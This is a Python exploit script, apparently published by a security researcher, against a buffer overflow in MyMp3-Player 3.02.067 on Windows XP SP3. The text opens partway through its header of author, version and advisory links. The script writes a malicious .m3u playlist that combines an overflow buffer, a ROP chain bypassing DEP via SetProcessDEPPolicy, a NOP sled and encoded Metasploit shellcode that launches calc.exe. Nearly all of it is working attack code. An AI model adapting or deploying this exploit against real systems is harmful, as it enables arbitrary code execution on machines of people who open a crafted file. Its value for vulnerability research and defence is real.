uthor: Daniel Romero Perez (@daniel_rome)
Software & Version: MyMp3-Player 3.02.067
Tested on: Windows XP SP3 - ES
Mail: unlearnsecurity@gmail.com
Blog: unlearningsecurity.blogspot.com
Advisor: http://www.securityfocus.com/bid/38835/info
Article: http://unlearningsecurity.blogspot.com.es/2012/07/bypass-dep-no-permanente-con.html
'''
import os
import struct
 
# Buffer
Buff = "\x41" * 1024
 
# ShellCode (ruby msfpayload windows/exec CMD=calc.exe R | ruby msfencode -b '\x0a\x0d\x20\x00' -t c) - 227 bytes
ShellCode = ("\xb8\xf8\x16\x8a\x64\xd9\xe9\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
    "\x33\x31\x46\x12\x83\xc6\x04\x03\xbe\x18\x68\x91\xc2\xcd\xe5"
    "\x5a\x3a\x0e\x96\xd3\xdf\x3f\x84\x80\x94\x12\x18\xc2\xf8\x9e"
    "\xd3\x86\xe8\x15\x91\x0e\x1f\x9d\x1c\x69\x2e\x1e\x91\xb5\xfc"
    "\xdc\xb3\x49\xfe\x30\x14\x73\x31\x45\x55\xb4\x2f\xa6\x07\x6d"
    "\x24\x15\xb8\x1a\x78\xa6\xb9\xcc\xf7\x96\xc1\x69\xc7\x63\x78"
    "\x73\x17\xdb\xf7\x3b\x8f\x57\x5f\x9c\xae\xb4\x83\xe0\xf9\xb1"
    "\x70\x92\xf8\x13\x49\x5b\xcb\x5b\x06\x62\xe4\x51\x56\xa2\xc2"
    "\x89\x2d\xd8\x31\x37\x36\x1b\x48\xe3\xb3\xbe\xea\x60\x63\x1b"
    "\x0b\xa4\xf2\xe8\x07\x01\x70\xb6\x0b\x94\x55\xcc\x37\x1d\x58"
    "\x03\xbe\x65\x7f\x87\x9b\x3e\x1e\x9e\x41\x90\x1f\xc0\x2d\x4d"
    "\xba\x8a\xdf\x9a\xbc\xd0\xb5\x5d\x4c\x6f\xf0\x5e\x4e\x70\x52"
    "\x37\x7f\xfb\x3d\x40\x80\x2e\x7a\xbe\xca\x73\x2a\x57\x93\xe1"
    "\x6f\x3a\x24\xdc\xb3\x43\xa7\xd5\x4b\xb0\xb7\x9f\x4e\xfc\x7f"
    "\x73\x22\x6d\xea\x73\x91\x8e\x3f\x10\x74\x1d\xa3\xf9\x13\xa5"
    "\x46\x06")
     
Nops = "\x90" * 50
     
##ROP --> Bypass DEP with SetProcessDEPPolicy
ROP = struct.pack('<L',0x77f4c25f) # POP EBX / RET
ROP += struct.pack('<L',0x41414141) # JUNK
ROP += struct.pack('<L',0xFFFFFFFF) # PARAMETER 0x00000000 - 0x1 = 0xFFFFFFFF
ROP += struct.pack('<L',0x7e810b7e) # INC EBX / RET
ROP += struct.pack('<L',0x77f445bf) # POP EBP / RET
ROP += struct.pack('<L',0x7C862144) # <- SetProcessDEPPolicy
ROP += struct.pack('<L',0x77f45493) # POP EDI / RET
ROP += struct.pack('<L',0x77f4108c) # RET
ROP += struct.pack('<L',0x77f4567e) # POP ESI  / RET
ROP += struct.pack('<L',0x77f4108c) # RET
ROP += struct.pack('<L',0x58c35ff7) # PUSHAD / RET
 
# Exploit
exploit = Buff + ROP + Nops + ShellCode
 
# Create File
file = open("exploit_mymp3-player_BOF.m3u", "wb")
file.write(exploit)
file.close()
 
print ("Your file has been generated successfully!!")

